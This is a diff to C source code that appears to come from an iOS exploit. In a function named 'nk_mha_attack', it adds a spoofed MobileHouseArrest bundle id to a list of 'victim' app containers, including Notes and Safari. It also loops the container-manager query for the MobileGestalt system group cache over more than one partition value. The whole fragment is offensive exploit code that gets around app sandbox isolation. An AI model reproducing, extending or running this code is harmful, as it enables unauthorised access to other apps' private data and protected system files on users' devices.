@@ -43,6 +43,8 @@ typedef void *container_query_t;
 typedef void *container_object_t;
 
 static const char *k_victims[] = {
+    "com.apple.mobile.MobileHouseArrest",   // our own (spoofed) id: the
+                                             // container we know exists
     "com.dj.srk801",
     "com.apple.mobilenotes",
     "com.apple.mobilesafari",
@@ -167,13 +169,14 @@ void nk_mha_attack(void)
 
     /* --- class 13: the MobileGestalt system group ---------------------- */
     if (q_gids) {
+      for (uint32_t partv = 0; partv <= 3; partv += 3) {
         container_query_t q = q_create();
         q_class(q, 13);
         xpc_object_t g = xpc_string_create("systemgroup.com.apple.mobilegestaltcache");
         q_gids(q, g);
         xpc_release(g);
         q_flags(q, 0x8100000000ULL);
-        if (q_part) q_part(q, 3);
+        if (q_part) q_part(q, partv);
         container_object_t borrowed = q_result(q);
         container_object_t obj = borrowed ? o_copy(borrowed) : NULL;
         if (!obj) {
@@ -197,6 +200,7 @@ void nk_mha_attack(void)
             o_free(obj);
         }
         q_free(q);
+      }
     }
 
     dlclose(lib);
